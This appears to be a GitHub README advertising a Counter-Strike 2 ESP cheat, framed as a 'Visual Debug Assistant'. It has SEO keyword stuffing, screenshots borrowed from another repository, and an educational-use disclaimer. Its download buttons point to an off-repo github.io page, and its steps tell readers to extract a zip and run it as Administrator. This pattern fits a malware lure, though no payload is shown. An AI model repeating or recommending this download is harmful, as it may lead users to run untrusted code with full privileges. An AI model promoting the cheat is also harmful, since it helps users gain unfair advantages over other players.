# Counter-Strike 2 ESP — Visual Debug Assistant

[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://esp-counter-strike-2.github.io/.github/)
[![Download Now](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://esp-counter-strike-2.github.io/.github/)

---

## 🔧 Overview

**CS2 Visual Debug Assistant** is a lightweight, non-invasive utility designed to provide a layer of real-time visual feedback within Counter-Strike 2.  
It allows users to display ESP-style overlays, track entity positions, log in-game coordinates, and inspect basic memory structures — all without modifying game files or injecting malicious code.

This tool is ideal for:

- Game developers and reverse engineers  
- UI/UX modders and interface designers  
- Technical artists studying CS2’s 3D space  
- Enthusiasts working on analysis or offline prototyping tools  

---

## ⚙️ How to Use

1. Click the **Download Setup Assistant** button above  
2. Extract the `.zip` archive using [7-Zip](https://www.7-zip.org/) or WinRAR  
3. Launch CS2 in **borderless** or **windowed** mode  
4. Run the debug assistant tool as Administrator  
5. Use hotkeys to enable overlay layers, toggle entity logging, or adjust visualization options via the UI panel

---

## 🎯 Key Features

### 🟥 ESP-Style Box Overlay  
- Draws real-time 2D bounding boxes around in-game entities  
- Adjustable box color, opacity, thickness  
- Supports both ally and enemy rendering filters  

### 🧠 Memory Inspection  
- Read basic game structures (e.g. entity list, view matrix)  
- Visualize camera FOV, local position, and bone origins  
- No memory injection — passive, read-only mode  

### 🎨 Customizable Overlay UI  
- Floating config window to control modules  
- Position tracking, logging, and FOV calibration  
- Minimal performance impact (runs in separate thread)

### 📡 Coordinate Tracker  
- Logs entity XYZ data in real time  
- Displays head, feet, and origin vectors 

---

## 🖼 Preview

![ESP-Style Box Overlay](https://raw.githubusercontent.com/Extravi/cs2-kernel-esp/main/screenshots/Screenshot%202024-04-12%20021914.png)  
*Bounding boxes rendered around player models for layout alignment*

![Skeleton & Bone Debugging](https://repository-images.githubusercontent.com/672307507/9a1a0fc5-3fb3-4cd4-9e2a-c22c372ed4ae)  
*Visualizing character skeleton and joint structure*


---

## 🔍 SEO Keywords

cs2 visual overlay, cs2 debug assistant, cs2 entity bounding box, cs2 esp tool, cs2 overlay renderer, cs2 memory viewer, cs2 coordinate tracker, cs2 visualization assistant, cs2 ui debug tool, cs2 esp dev utility, cs2 development overlay

---

## 🛑 Disclaimer

This repository and its contents are intended **solely for educational and development purposes**.  
We do **not** support or encourage any form of unfair play, cheating, or interference with multiplayer environments.

Using this tool in official CS2 matchmaking or VAC-protected modes **may result in a ban**. Use responsibly, only in safe environments (e.g. custom servers, test instances, or demos).
